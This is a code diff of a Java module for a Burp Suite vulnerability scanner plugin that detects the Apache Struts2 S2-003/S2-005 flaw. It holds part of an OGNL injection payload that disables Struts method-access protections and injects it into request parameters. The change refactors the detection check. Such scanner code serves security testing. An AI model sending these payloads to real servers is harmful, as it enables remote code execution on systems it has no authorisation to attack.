@@ -1,14 +1,11 @@
 package module.java.vul;
 
 import burp.*;
-import module.Util;
 
+import java.io.PrintWriter;
 import java.net.URLEncoder;
-import java.util.Arrays;
 
 public class S2_003_005 extends IModule {
-    public String randomMark = Util.getRandomString(16);
-    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
     public String poc =
         "(a)(('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(a))" +
         "&(b)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(b))" +
@@ -33,28 +30,17 @@ public class S2_003_005 extends IModule {
 
     @Override
     public IScanIssue start() {
-        IHttpService httpService = iHttpRequestResponse.getHttpService();
-        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
-        byte[] request = iHttpRequestResponse.getRequest();
         String[] parameterNames = poc.split("&");
 
         byte in = (byte) 0;
         if (requestInfo.getMethod().equals("POST")) {
             in = (byte) 1;
         }
-        byte[] newRequest = request;
         for (String parameterName: parameterNames) {
             IParameter newParameter = helpers.buildParameter(URLEncoder.encode(parameterName), "1", in);
-            newRequest = helpers.updateParameter(newRequest, newParameter);
+            request = helpers.updateParameter(request, newParameter);
         }
-
-        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
-        byte[] response = newHttpRequestResponse.getResponse();
-        IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
-        byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
-        String bodyText = new String(body);
-        if (bodyText.contains(randomMark)) {
-            this.iHttpRequestResponse = newHttpRequestResponse;
+        if (check()) {
             this.detail = URLEncoder.encode(exp);
             return creatCustomScanIssue();
         }
